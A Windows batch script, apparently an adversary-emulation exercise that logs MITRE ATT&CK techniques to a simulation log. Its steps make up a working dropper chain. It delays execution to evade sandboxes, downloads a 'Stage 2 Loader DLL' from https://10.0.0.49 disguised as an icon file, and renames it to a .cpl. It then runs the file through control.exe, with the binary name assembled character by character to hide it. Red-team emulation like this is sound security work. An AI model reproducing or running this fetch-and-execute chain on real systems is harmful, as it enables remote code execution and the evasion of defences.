@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder assignments (random-named SET variables)
SET douyiw=%APPDATA%\10944\2fefb1f6
SET qmzxkp=16fdea76.txt
SET akjvnm=https://10.0.0.49/stage/2/icon.png?10944-7
SET bnvxcv=BALAM-S2BO
SET cvbhyu=10944
SET mnbvcx=7
SET lkjhgv=%PUBLIC%\\macula-simulations.log
SET poiuyw=https://10.0.0.49

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM --------------------------------------------------
REM Phase 0: Initial delay (10-20s)
REM --------------------------------------------------
timeout /t 12 /nobreak >nul

REM --------------------------------------------------
REM Phase 1: Debug check start
REM --------------------------------------------------
echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: heartbeat_start>> "!lkjhgv!" 2>nul

REM --------------------------------------------------
REM Phase 2: Heartbeat fetch - download Stage 2 Loader DLL
REM --------------------------------------------------
curl -k -s -o "!douyiw!\!qmzxkp!" "!akjvnm!" >nul 2>&1
SET hb_exit=!ERRORLEVEL!
timeout /t 8 /nobreak >nul

IF !hb_exit! EQU 0 (
    echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: heartbeat_complete=0>> "!lkjhgv!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: heartbeat_complete=1>> "!lkjhgv!" 2>nul
)

REM --------------------------------------------------
REM Phase 3: Execution delay (5-15s using ping)
REM --------------------------------------------------
ping -n 10 127.0.0.1 >nul
timeout /t 6 /nobreak >nul

REM --------------------------------------------------
REM Phase 4: Anti-analysis - Debugger check (simulated)
REM --------------------------------------------------
REM Allowed: Debugger.IsAttached check only. If detected, add Thread.Sleep(random 2000-5000ms) but do NOT abort.
REM We simulate by a random delay injection (no actual debugger detection in batch).
SET /A debug_delay=%RANDOM% %% 3001 + 2000
timeout /t !debug_delay! /nobreak >nul 2>nul
echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: antidebug_check=0>> "!lkjhgv!" 2>nul

REM --------------------------------------------------
REM Phase 5: Change working directory to output dir
REM --------------------------------------------------
echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: chdir_start>> "!lkjhgv!" 2>nul
cd /d "!douyiw!" >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
    echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: chdir_result=0>> "!lkjhgv!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: chdir_result=1>> "!lkjhgv!" 2>nul
)

REM --------------------------------------------------
REM Phase 6: Additional delay (random 10-30s using for/timeout ticks)
REM --------------------------------------------------
SET /A delay_extra=%RANDOM% %% 20 + 10
for /l %%i in (1,1,!delay_extra!) do timeout /t 1 /nobreak >nul

REM --------------------------------------------------
REM Phase 7: Rename downloaded DLL to .cpl
REM --------------------------------------------------
echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: rename_start>> "!lkjhgv!" 2>nul
FOR %%i IN ("!qmzxkp!") DO SET base_cpl=%%~ni
ren "!qmzxkp!" "!base_cpl!.cpl" >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
    echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: rename_result=0>> "!lkjhgv!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: rename_result=1>> "!lkjhgv!" 2>nul
)
ping -n 5 127.0.0.1 >nul

REM --------------------------------------------------
REM Phase 8: Variable indirection obfuscation for control.exe
REM --------------------------------------------------
REM Build "control" character by character (reverse: lortnoc -> control)
SET c1=c
SET c2=o
SET c3=n
SET c4=t
SET c5=r
SET c6=o
SET c7=l
SET lolbin_base=!c1!!c2!!c3!!c4!!c5!!c6!!c7!
SET lolbin=!lolbin_base!.exe

REM Build full absolute path to .cpl file
REM We use variable indirection to resolve output dir from random var
CALL SET outdir_full=%%douyiw%%
CALL SET cpl_file_full=%%base_cpl%%
SET target_path=!outdir_full!\!cpl_file_full!.cpl

REM Obfuscate the LOLBIN invocation using FOR /F command building
FOR /F "tokens=*" %%a IN ('echo !lolbin!') DO SET bin_exec=%%a
echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: controlexec_start>> "!lkjhgv!" 2>nul

REM Execute control.exe with full path
!bin_exec! "!target_path!"
SET lolbin_exit=!ERRORLEVEL!

IF !lolbin_exit! EQU 0 (
    echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: controlexec_result=0>> "!lkjhgv!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!bnvxcv!][!cvbhyu!]: controlexec_result=!lolbin_exit!>> "!lkjhgv!" 2>nul
)

REM --------------------------------------------------
REM Phase 9: TTP logging
REM --------------------------------------------------
REM T1218 - System Binary Proxy Execution
echo [!tsvar!][TTP][!bnvxcv!][!cvbhyu!]: T1218^|System Binary Proxy Execution=OK:>> "!lkjhgv!" 2>nul
REM T1497 - Virtualization/Sandbox Evasion
echo [!tsvar!][TTP][!bnvxcv!][!cvbhyu!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!lkjhgv!" 2>nul
REM T1027 - Obfuscated Files or Information
echo [!tsvar!][TTP][!bnvxcv!][!cvbhyu!]: T1027^|Obfuscated Files or Information=OK:>> "!lkjhgv!" 2>nul

REM --------------------------------------------------
REM Phase 10: Exit immediately - no loop
REM --------------------------------------------------
exit /b 0